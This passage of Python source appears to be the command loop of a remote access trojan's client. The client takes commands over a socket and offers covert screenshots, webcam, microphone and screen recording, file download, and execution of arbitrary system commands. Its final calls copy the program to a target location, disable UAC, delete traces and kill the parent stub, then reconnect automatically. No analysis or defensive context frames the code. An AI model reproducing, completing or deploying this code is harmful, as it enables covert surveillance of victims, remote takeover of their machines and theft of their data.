            hb_thread.start()

            while True:
                # Read the data. If there is no data, the loop is broken.
                data = conn.recv(8192)
                if not data:
                    break
                
                buffer += data
                
                while b'\n' in buffer:
                    line, buffer = buffer.split(b'\n', 1)
                    try:
                        payload = json.loads(line.decode('utf-8'))
                        command = payload.get("command", "").strip()
                        if not command:
                            continue
                            
                        cmd_name = command.split()[0]
                        args = command[len(cmd_name):].strip()

                        func = COMMANDS_REGISTRY.get(cmd_name)
                        
                        if not func:
                            send_response(conn, f"❌ Unknown team: {cmd_name}")
                            continue

                        result = None # Initialize the result
                        is_file_result = False
                        file_path = None

                        
                        try:
                            sig = inspect.signature(func)
                            params_count = len(sig.parameters)

                            # Scenario A: The function wants everything (payload, conn, buffer) -> usually loading files
                            if params_count >= 3:
                                result = func(payload, conn, buffer)
                                buffer = b'' # Clear the buffer since it is consumed by the function
                            
                            # Scenario B: Function wants (args, conn) -> for streaming or complex commands
                            elif params_count == 2:
                                # If the command should run in the background (screenshots, audio, etc.)
                                if cmd_name in ["/screenshot", "/sc", "/photo", "/download", "/mic", "/webcam", "/screenrecord", "/open_image", "/audiorecord", "/playsound", "/screenshot_full", "/scfull"]:
                                    threading.Thread(target=func, args=(args, conn), daemon=True).start()
                                    result = None
                                else:
                                    #logger.info(f"Calling command with socket: {conn}")
                                    result = func(args, conn)

                            # Scenario B: Regular function (args) -> most commands and plugins
                            else:
                                res_raw = func(args)
                                # Process tuple (for /restart)
                                if isinstance(res_raw, tuple):
                                    result, is_file_result, file_path = res_raw
                                else:
                                    result = res_raw

                        except Exception as e:
                            result = f"❌ Error Executions {cmd_name}: {str(e)}"
                            logger.error(result)

                        # ---RESULT PROCESSING ---
                        
                        # Check for auto-sending files for system commands
                        if cmd_name in ["/execute", "/ex", "/tasklist"] and isinstance(result, str) and os.path.exists(result):
                            is_file_result = True
                            file_path = result
                            result = f"✅ The {cmd_name} command output is ready to be sent as a TXT file." 

                        if result:
                            send_response(conn, result, cmd_name=cmd_name, is_file=is_file_result, file_path=file_path)

                            if "✅ The client is restarted." in str(result): 
                                logger.warning("Terminating a process by server command.")
                                os._exit(0)
                                                    
                    except json.JSONDecodeError:
                        buffer = line + b'\n' + buffer 
                        break 
                        
                    except Exception as e:
                        send_response(conn, f"❌ Error парсинга: {str(e)}")
                        
        except Exception as e:
            logger.error(f"Error Connections: {e}")
        finally:
            # Reset the global socket when disconnected
            with socket_lock:
                current_socket = None
                
            if conn:
                conn.close()
                
            # Stop thread auto
            stop_event.set()
            if auto_thread and auto_thread.is_alive():
                auto_thread.join(1)
                
            # 🔥 Stop Heartbeat
            hb_stop_event.set()
            if 'hb_thread' in locals() and hb_thread.is_alive():
                hb_thread.join(1)
            
            logger.warning("Reconnection...")
            time.sleep(RECONNECT_DELAY)

setup_libs_path()
copy_to_target()
disable_uac()
delete_mei()
kill_parent_stub()
main_client_loop()
